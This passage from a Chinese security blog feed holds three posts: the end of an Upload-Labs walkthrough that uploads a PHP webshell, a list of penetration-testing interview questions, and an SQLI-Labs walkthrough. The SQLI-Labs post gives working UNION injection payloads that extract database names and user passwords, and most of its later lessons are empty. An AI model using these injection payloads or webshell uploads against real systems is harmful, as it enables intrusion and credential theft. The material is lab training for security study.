xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">file_name = reset(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>file) . ‘.’ . <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo stretchy=\"false\">[</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">file[count(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>file) - 1];</strong><br>\n<strong> 最终的文件名是由数组的第一个和最后一个元素拼接而成。是由数组的第一个和最后一个元素拼接而成。</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!is_array(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = explode(<span class=\"string\">&#x27;.&#x27;</span>, strtolower(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>这个判断：不是数组，就自己拆成数组，也就是说，用户可以传入数组的。</strong><br>\n<img src=\"Upload-Labs/1503176-20200316150923531-1902899728.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/1503176-20200316150923531-1902899728.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"><br>\n<strong> 我们上传一个 jpg 图片马抓包，然后改包如下图，传入两个参数 save_name [0] 和 save_name [2]</strong><br>\n<a href=\"https://img2020.cnblogs.com/blog/1503176/202003/1503176-20200316151203517-1428739655.png\"><img src=\"Upload-Labs/1503176-20200316151203517-1428739655.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/1503176-20200316151203517-1428739655.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></a><br>\n<strong> 然后发包提示上传成功</strong><br>\n<img src=\"Upload-Labs/1503176-20200316151352968-278674324.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/1503176-20200316151352968-278674324.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"><br>\n<strong> 你可以看到你网站的 upload 目录下上传成功了 20.php, 蚁剑连接 ok</strong></p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二</h3>\n<p>00 截断上传的图片马然后文件包含连蚁剑 / 不细说了<br>\n可算是刷完了学到不少</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2022/03/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%9D%82/",
            "url": "http://example.com/2022/03/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%9D%82/",
            "title": "面试题杂",
            "date_published": "2022-03-20T10:39:27.000Z",
            "content_html": "<h1 id=\"面试题杂\"><a class=\"markdownIt-Anchor\" href=\"#面试题杂\"></a> 面试题杂</h1>\n<p>1、文件上传，绕过黑白名单。</p>\n<p>2、文件包含使用的函数</p>\n<p>3、存在反序列化漏洞的中间件</p>\n<p>4、代码执行和命令执行的区别，使用的函数</p>\n<p>5、使用http only，XSS怎么继续攻击？</p>\n<p>6、介绍数据库提权、第三方组件提权、SUID提权</p>\n<p>7、权限维持有哪些方法</p>\n<p>8、端口转发使用的工具</p>\n<p>9、MSF使用的熟悉程度</p>\n<p>10、mssql 删除xp_cmdshell 怎么提权</p>\n<p>11、怎么绕过CDN？</p>\n<p>12、内网渗透，无法连接外网，没有回显，获取数据</p>\n<p>13、内网渗透 和 外网渗透的区别？</p>\n<p>14、内网渗透思路？</p>\n<p>信息搜集都干什么?</p>\n<p>渗透测试文档都写什么东西？</p>\n<p>怎么挖的xss？</p>\n<p>网站设置了httponly还能不能使用xss攻击？</p>\n<p>TCP协议跟UDP协议对应的端口号？</p>\n<p>都知道哪些扫描工具？</p>\n<p>Appscan和AWVS的区别？</p>\n<p>php代码审计的流程？</p>\n<p>怎么端口转发？</p>\n<p>都用过哪些linux的常用命令？</p>\n<p>init 0-6 的作用？</p>\n<p>ps跟netstat有什么相同的地方</p>\n<p>如果一个站你扫描端口全开了是怎么回事？</p>\n<p>应急响应的基本流程</p>\n<p>mysql读文件，写文件，写一句话要什么条件</p>\n<p>mssql和mysql区别</p>\n<p>nmap扫描全开放扫描跟半开放扫描的区别</p>\n<p>为什么要用半开放扫描</p>\n<p>php源码审计注意事项</p>\n<p>讲一下内网信息收集</p>\n<p>讲一下流量转发</p>\n<p>讲一下域渗透</p>\n<p>数据库提权有哪些</p>\n<p>dns外带数据所利用的平台，使用的漏洞环境</p>\n<p>docker编排</p>\n<p>CS console</p>\n<p>XML利用调用的函数</p>\n<p>流量转发的工具</p>\n<p>命令执行 代码执行的区别，分别利用的函数</p>\n<p>Sqlmap参数</p>\n<p>Nmap参数，全扫和半扫的区别</p>\n<p>逻辑漏洞：密码找回</p>\n<p>Windows提权漏洞有哪些</p>\n<p>Windows怎么提权</p>\n<p>linux系统被入侵后如何排查</p>\n<p>burpsuite爆破模块的四种模式</p>\n<p>msf使用ms17-010攻击流程</p>\n<p>WAF绕过方式</p>\n<p>为什么使用sqlmap的–cookie参数</p>\n<p>Nmap的一些命令</p>\n<p>Sqlmap写文件getshell</p>\n<p>端口转发用什么软件</p>\n<p>缓冲区溢出漏洞 如何降低权限</p>\n<p>怎么进行xxe注入</p>\n<p>本地文件包含怎么getshell</p>\n<p>Windows本地提权</p>\n<p>数据库提权</p>\n<p>怎么拿到域控</p>\n<p>Linux应急响应</p>\n<p>伪协议</p>\n<p>文件上传绕waf</p>\n<p>怎么降权</p>\n<p>Oracle数据库端口</p>\n<p>免杀</p>\n<p>抓鸡</p>\n<p>1、xss过滤尖括号怎么绕过</p>\n<p>2、ssrf怎么getshell</p>\n<p>3、mssql的提权方式，提权原理是什么，用sa用户提权的前提条件，不是sa用户可否提权</p>\n<p>4、mysql数据库的提权</p>\n<p>文件包含的本地包含和远程包含如何getshell，有什么区别</p>\n<p>代码执行和命令执行的区别，代码执行如何执行系统命令</p>\n<p>CSRF的利用，如何利用CSRF执行getshell</p>\n<p>如何绕过登陆界面的token验证</p>\n<p>操作系统system权限如何降权</p>\n<p>应急响应如何查看进程、端口、服务</p>\n<p>Burp suite的常用模块</p>\n<p>SQL server的getshell，除了xp_cmdshell还有什么</p>\n<p>mysql如何提权，gpc和利用写日志getshell的关系</p>\n<p>最近的安全漏洞</p>\n<p>lcx被杀软杀了怎么办 什么情况下用lcx</p>\n<p>信息收集做什么 子域名收集用什么工具 子域名挖掘机的原理 网络爬取的原理</p>\n<p>对于一个网站怎么防御</p>\n<p>linux常用命令</p>\n<p>怎么查看异常进程 端口 密码存放在哪里</p>\n<p>怎么看哪些用户可不可以登录 怎么看哪些用户有密码</p>\n<p>sql注入</p>\n<p>还有一个，www目录下有一万个文件，里面有一个标准的webshell，eval函数，怎么查出是哪个文件</p>\n<p>提交过的业务逻辑漏洞是怎样的</p>\n<p>文件上传只允许TXT文件，白名单绕过</p>\n<p>sqlmap中的–os-shell和–sql-shell有什么区别</p>\n<p>nmap完整扫描和半开放扫描</p>\n<p>mysql提权</p>\n<p>http向www.baidu.com的传输过程</p>\n<p>永恒之蓝和0708攻击方式有什么区别</p>\n<p>mysql UDF提权怎么提权</p>\n<p>mysql UDF提权.dll文件大于多少放那个文件夹下，小于多少放到哪个文件夹下。</p>\n<p>redis原理攻击方式</p>\n<p>心脏滴血攻击与原理</p>\n<p>mysql本地读取、写入、文件命令</p>\n<p>如果你现在已经进入内网，你会怎么进行下一步操作</p>\n<p>文件上传时，遇到waf怎么办，用什么方法绕过</p>\n<p>遇到双写绕过你怎么防御</p>\n<p>本地文件包含，是否可以getshell，怎么getshell</p>\n<p>搜索引擎有哪些语法</p>\n<p>怎么判断你所获取的主机是否是在域内</p>\n<p>oracle数据外带函数方式</p>\n<p>oracle报错注入有哪些函数</p>\n<p>mysql报错注入的函数有哪些</p>\n<p>mssql提权的方式</p>\n<p>ssrf怎么利用除了扫描内网ip端口</p>\n<p>应急响应措施</p>\n<p>linux日志在哪</p>\n<p>linux和windows权限维持有哪些</p>\n<p>1.提权的原理</p>\n<p>2.mysql提权的原理</p>\n<p>3.近期发生的安全事件</p>\n<p>4.外带数据的原理</p>\n<p>1.msf的使用，以及用msf复现过哪些漏洞，利用过程</p>\n<p>2.445和3389端口</p>\n<p>3.nmap具体参数：-p，-sS，-Pn，等，如想指定端口命令该如何写？</p>\n<p>4.sqlmap的参数：–dbs，–os-shell，–cmd-shell，–sql-shell，如何寻找路径</p>\n<p>5.SSRF漏洞，结合什么利用，</p>\n<p>6.SQL注入绕WAF</p>\n<p>7.linux应急响应的步骤，思路，如何定位问题文件？</p>\n<p>8.端口，进程和服务的区别</p>\n<p>9.端口转发和反弹端口</p>\n<p>10.如何查找有问题的进程</p>\n<p>11.windows下如何查看启动的服务</p>\n<p>12.burpsuite抓包时，遇到302跳转页面怎么办</p>\n<p>如何用本地文件包含getshell，</p>\n<p>如何让domxss实现 存储型xss的效果。</p>\n<p>如何判断多重cdn的真实ip</p>\n<p>如何手工找ssrf漏洞，</p>\n<p>XXE利用</p>\n<p>sql server提权</p>\n<p>sqlmap获取数据库权限 --os-shell --sql-shell</p>\n<p>nmap --script检测到漏洞如何发到msf利用</p>\n<p>端口 mssql 1433 mysql 3306 oracle 1521 redis 6379</p>\n<p>条件竞争</p>\n<p>文件上传漏洞绕waf</p>\n<p>联合查询获取到version()后5.x,4.x干啥</p>\n<p>xss如何绕过同源策略，mssql没有sa账户如何提权，hydra如何暴破weblogic</p>\n<p>1，问我写过啥文章</p>\n<p>2，漏洞咋找的</p>\n<p>3，mssql的sa，db账户有啥区别</p>\n<p>4，mongodb未授权</p>\n<p>5，sqlmap</p>\n<p>6，CSRF，文件包含</p>\n<p>7，数据库提权，udf和mof</p>\n<p>8，内网转发端口，lcx</p>\n<p>9，宽字节注入</p>\n<p>10，问我以前的工作经验，干啥了</p>\n<p>11，你当时复现ST2-053哪里函数造成的漏洞</p>\n<p>密码重置漏洞怎么防御?</p>\n<p>端口转发的操作:</p>\n<p>流量转发的原理:</p>\n<p>sqlmap常用的参数:</p>\n<p>数据库的配置文件</p>\n<p>sql注入读文件一般读哪一些文件</p>\n<p>sql server数据库提权流程:</p>\n<p>常用的本地提权:</p>\n<p>suid提权:</p>\n<p>常用的linux 的命令:</p>\n<p>命令执行和代码执行的区别</p>\n<p>服务器中了挖矿程序怎么检测</p>\n<p>udf提权原理</p>\n<p>linux留后门的方式有哪些</p>\n<p>csrf的原理、攻击、防御</p>\n<p>csrf如何getshell</p>\n<p>mof提权</p>\n<p>sqlserver 非sa用户如何提权</p>\n<p>文件包含只能包含本地文件,如何getshell</p>\n<p>windows提权方式</p>\n<p>域渗透</p>\n<p>如何拿到管理员密码</p>\n<p>拿到管理员密码是加密的怎么办</p>\n<p>如何拿到管理员密码被加密解不开怎么办</p>\n<p>拿到高权限后如何降权</p>\n<p>进入内网后如何查找域控服务器</p>\n<p>怎么拿到域管理员权限</p>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2022/01/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQLI-Labs/",
            "url": "http://example.com/2022/01/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQLI-Labs/",
            "title": "SQLI Labs",
            "date_published": "2022-01-14T03:40:59.000Z",
            "content_html": "<h1 id=\"sqli-labs\"><a class=\"markdownIt-Anchor\" href=\"#sqli-labs\">#</a> SQLI-Labs</h1>\n<h2 id=\"less-1-get-error-based-single-quotes-string基于错误的get单引号字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#less-1-get-error-based-single-quotes-string基于错误的get单引号字符型注入\">#</a> less-1 GET - Error based - Single quotes - String (基于错误的 GET 单引号字符型注入)</h2>\n<p>字符型单引号闭合</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$<span class=\"keyword\">sql</span><span class=\"operator\">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">#确定注入点</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">#字段</span></span><br><span class=\"line\"><span class=\"string\">?id=-1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span><span class=\"comment\">--+</span></span><br><span class=\"line\">#爆数据库</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata--+</span></span><br><span class=\"line\"><span class=\"string\">#爆tables</span></span><br><span class=\"line\"><span class=\"string\">?id=-1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,database(),group_concat(table_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"string\">&#x27;security&#x27;</span><span class=\"comment\">--+</span></span><br><span class=\"line\">#爆columns</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class=\"string\">&#x27; and table_name=&#x27;</span>users<span class=\"string\">&#x27;--+</span></span><br><span class=\"line\"><span class=\"string\">#id,username,password</span></span><br><span class=\"line\"><span class=\"string\">?id=-1&#x27;</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(username),group_concat(password) <span class=\"keyword\">from</span> security.users <span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-2-get-error-based-intiger-based-基于错误的get整型注入\"><a class=\"markdownIt-Anchor\" href=\"#less-2-get-error-based-intiger-based-基于错误的get整型注入\">#</a> less-2 GET - Error based - Intiger based (基于错误的 GET 整型注入)</h2>\n<p>数字型</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$<span class=\"keyword\">sql</span><span class=\"operator\">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#确定注入点</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">#字段</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span><span class=\"comment\">--+</span></span><br><span class=\"line\">#爆数据库</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,database(),group_concat(schema_name) <span class=\"keyword\">from</span> information_schema.schemata<span class=\"comment\">--+</span></span><br><span class=\"line\">#爆tables</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,database(),group_concat(table_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"string\">&#x27;security&#x27;</span><span class=\"comment\">--+</span></span><br><span class=\"line\">#爆columns</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,database(),group_concat(column_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"string\">&#x27;security&#x27;</span> <span class=\"keyword\">and</span> table_name<span class=\"operator\">=</span><span class=\"string\">&#x27;users&#x27;</span><span class=\"comment\">--+</span></span><br><span class=\"line\">#id,username,password</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(username),group_concat(password) <span class=\"keyword\">from</span> security.users <span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-3-get-error-based-single-quotes-with-twist-string-基于错误的get单引号变形字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#less-3-get-error-based-single-quotes-with-twist-string-基于错误的get单引号变形字符型注入\">#</a> less-3 GET - Error based - Single quotes with twist string (基于错误的 GET 单引号变形字符型注入)</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$<span class=\"keyword\">sql</span><span class=\"operator\">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class=\"line\">#闭合括号</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27;) union select 1,2,3 --+</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-4-get-error-based-double-quotes-string-基于错误的get双引号字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#less-4-get-error-based-double-quotes-string-基于错误的get双引号字符型注入\">#</a> less-4 GET - Error based - Double Quotes - String （基于错误的 GET 双引号字符型注入）</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id<span class=\"operator\">=</span>$<span class=\"keyword\">GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\">$id <span class=\"operator\">=</span> <span class=\"string\">&#x27;&quot;&#x27;</span> . $id . <span class=\"string\">&#x27;&quot;&#x27;</span></span><br><span class=\"line\">$<span class=\"keyword\">sql</span><span class=\"operator\">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class=\"line\">#闭合双引号括号</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span>&quot;) union select 1,2,3 --+</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-5-get-double-injection-single-quotes-string-双注入get单引号字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#less-5-get-double-injection-single-quotes-string-双注入get单引号字符型注入\">#</a> less-5 GET - Double Injection - Single Quotes - String (双注入 GET 单引号字符型注入)</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$<span class=\"keyword\">sql</span><span class=\"operator\">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">#正常单引号闭合字符型，但是不会显示信息，只有成功失败的不同</span><br><span class=\"line\"></span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">&#x27; union select 1,2,3 --+</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> sysobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> <span class=\"comment\">--+</span></span><br><span class=\"line\">#<span class=\"keyword\">Table</span> <span class=\"string\">&#x27;security.sysobjects&#x27;</span> doesn<span class=\"string\">&#x27;t exist</span></span><br><span class=\"line\"><span class=\"string\">?id=1&#x27;</span><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> <span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-6\"><a class=\"markdownIt-Anchor\" href=\"#less-6\">#</a> less-6</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-7\"><a class=\"markdownIt-Anchor\" href=\"#less-7\">#</a> less-7</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-8\"><a class=\"markdownIt-Anchor\" href=\"#less-8\">#</a> less-8</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-9\"><a class=\"markdownIt-Anchor\" href=\"#less-9\">#</a> less-9</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> less-10</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-11\"><a class=\"markdownIt-Anchor\" href=\"#less-11\">#</a> less-11</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-12\"><a class=\"markdownIt-Anchor\" href=\"#less-12\">#</a> less-12</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-13\"><a class=\"markdownIt-Anchor\" href=\"#less-13\">#</a> less-13</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-14\"><a class=\"markdownIt-Anchor\" href=\"#less-14\">#</a> less-14</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-15\"><a class=\"markdownIt-Anchor\" href=\"#less-15\">#</a> less-15</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-16\"><a class=\"markdownIt-Anchor\" href=\"#less-16\">#</a> less-16</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-17\"><a class=\"markdownIt-Anchor\" href=\"#less-17\">#</a> less-17</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-18\"><a class=\"markdownIt-Anchor\" href=\"#less-18\">#</a> less-18</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-19\"><a class=\"markdownIt-Anchor\" href=\"#less-19\">#</a> less-19</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-20\"><a class=\"markdownIt-Anchor\" href=\"#less-20\">#</a> less-20</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-21\"><a class=\"markdownIt-Anchor\" href=\"#less-21\">#</a> less-21</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-22\"><a class=\"markdownIt-Anchor\" href=\"#less-22\">#</a> less-22</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-23\"><a class=\"markdownIt-Anchor\" href=\"#less-23\">#</a> less-23</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-24\"><a class=\"markdownIt-Anchor\" href=\"#less-24\">#</a> less-24</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-25\"><a class=\"markdownIt-Anchor\" href=\"#less-25\">#</a> 